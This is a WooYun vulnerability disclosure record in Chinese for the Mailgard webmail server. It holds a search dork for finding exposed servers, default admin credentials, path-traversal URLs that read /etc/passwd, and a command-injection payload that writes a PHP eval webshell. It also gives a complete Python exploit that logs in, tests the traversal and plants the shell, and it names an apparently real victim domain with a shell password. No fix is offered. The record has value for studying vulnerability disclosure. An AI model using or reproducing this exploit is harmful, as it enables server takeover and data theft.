{"id": 35881, "wybug_id": "wooyun-2015-097649", "wybug_title": "佑友(mailgard webmail)邮件服务器getshell 0day，附python exp", "wybug_corp": "佑友", "wybug_author": "f4ckbaidu", "wybug_date": "2015-02-17 18:14", "wybug_open_date": "2015-05-29 17:18", "wybug_type": "", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取", "目录遍历"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-29：\t细节向公众公开  简要描述： 过年前来一发，能得个闪电吗？ 详细说明：  一、任意文件下载（需要登录）百度搜索intitle:\"mailgard webmail\"，多家没有改admin密码的中招，默认密码admin/hicomadminhttp://mail.xxx.com.cn/src/read_file.php?signature=../../../../../../../etc/passwdhttp://mail.xxx.com.cn/src/read_file.php?uploadimage=../../../../../../../../../../etc/passwd根据此漏洞读取lighttpd error.log得到web更目录：/var/www/newmail/\n\n二、系统命令执行导致getshell下载文件进行代码审计，找到一个命令执行漏洞/var/www/newmail/src/ajaxserver.php第1789行开始：\nif($_GET['exec'] == 'recall'){ // 撤回邮件\t$user\t\t= str_replace('\\\\','\\\\\\\\',$_POST['user']);\t$messageid\t= str_replace('\\\\','\\\\\\\\',$_POST['messageid']);\tsystem(HM_SHELL.\"Mail_recall.sh '\".$user.\"' '\".$messageid.\"' '\".$onlineip.\"' >null &\");\tunset($_SESSION['H_MAILS']['Sent']);echo 'ok';exit;}\n程序员sb，直接毁了magic_quotes_gpc和addslashes的防护（系统自身带了全局过滤，代码抄袭discuz的），导致getshell：EXP如下，得到webshell，http://mail.sihc.com.cn/shell.php，密码123\nhttp://mail.xxx.com.cn/src/ajaxserver.php?exec=recallPOST: user=1'|echo '<?php eval($_POST[123]); ?>'>/var/www/newmail/shell.php #&messageid=1\n\n\n自动化exp如下：用法python fuck.py http://mail.test.com:80/ 帐号 密码\nimport requestsimport sysif len(sys.argv) < 4:\tprint 'usage:python fuck.py http(s)://target:port/ <username> <password>'\tprint 'example:python fuck.py http://mail.test.com:80/ admin admin'\tsys.exit(0)else:\ttarget = sys.argv[1]\tif not target.endswith('/'):\t\ttarget += '/'\tusername = sys.argv[2]\tpassword = sys.argv[3]\tsessionid = ''def login(target,username,password):\tlogin_request = ''\tglobal sessionid\tdomain = target[(target.index('.')+1):(target.index(':',6))]\tprint 'domain=' + domain\tlogin_url = target + 'index.php'\tpost_data = 'txtname=' + username + '&domain=' + domain + '&txtpwd=' + password + '&languages=zh-cn&button=%E7%99%BB+%E5%BD%95'\ttry:\t\tlogin_request = requests.post(login_url,post_data,allow_redirects=False,verify=False,timeout=3)\t\tif login_request.status_code == 302:\t\t\tprint 'login succeeded'\t\t\tsessionid = login_request.cookies['PHPSESSID']\t\t\treturn sessionid\t\telse:\t\t\tprint 'login failed,please check username and password'\t\t\treturn False\texcept Exception,e:   \t\tprint Exception,\":\",e\t\treturn Falsedef check(target,sessionid):\tcheck_request = ''\turl = target + 'src/read_file.php?uploadimage=../../../../../../../../../../etc/passwd'\trequest_header = {'cookie': 'MAILSESSID=' + str(sessionid) + '; PHPSESSID=' + str(sessionid)}\ttry:\t\tcheck_request = requests.get(url,headers=request_header,verify=False,timeout=3)\t\tif 'root:x:0:0:root:/root:/bin/bash' in check_request.text and check_request.status_code == 200:\t\t\tprint 'target is vulnerable\\r\\n'\t\t\t# print 'the content of file \\'/etc/passwd\\'\\r\\n'\t\t\t# print check_request.text\t\t\treturn True\t\telse:\t\t\tprint 'target is not vulnerable'\t\t\treturn False\texcept Exception,e:   \t\tprint Exception,\":\",e\t\treturn Falsedef getshell(target,sessionid):\tgetshell_request = ''\tfuckurl = target + 'src/ajaxserver.php?exec=recall'\tgetshell_header = {'cookie': 'MAILSESSID=' + str(sessionid) + '; PHPSESSID=' + str(sessionid)}\tgetshell_data = 'user=1\\'|echo \\'<?php eval($_POST[123]); ?>\\'>/var/www/newmail/shell123.php #&messageid=1'\t# print getshell_data\ttry:\t\tgetshell_request = requests.post(fuckurl,getshell_data,headers=getshell_header,allow_redirects=False,verify=False)\t\tif (requests.get(target + 'shell123.php',verify=False).status_code == 200):\t\t\tprint 'getshell succeeded,address:' + str(target + 'shell123.php') + ' password:123'\t\telse:\t\t\tprint 'getshell failed!'\texcept Exception,e:   \t\tprint Exception,\":\",e\t\treturn Falseif __name__ == '__main__':\tif (login(target,username,password)):\t\tprint 'sessionid=' + sessionid\t\tif(check(target,sessionid)):\t\t\tprint 'target is vulnerable to directory transversal'\t\telse:\t\t\tprint 'target is not vulnerable to directory transversal'\t\tprint 'trying to getshell,please wait'\t\tgetshell(target,sessionid)\n\n\n   漏洞证明：  百度搜索intitle:\"mailgard webmail\"，多家没有改admin密码的中招，默认密码admin/hicomadmin\n\n\n\n\n\n   修复方案：  i don't know   版权声明：转载请注明来源 f4ckbaidu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-02-28 17:16 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-19 15:19 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  exp写的有点问题，URL一定要带端口号才行    \n     2015-05-29 17:24 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  @f4ckbaidu 目测你要火啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}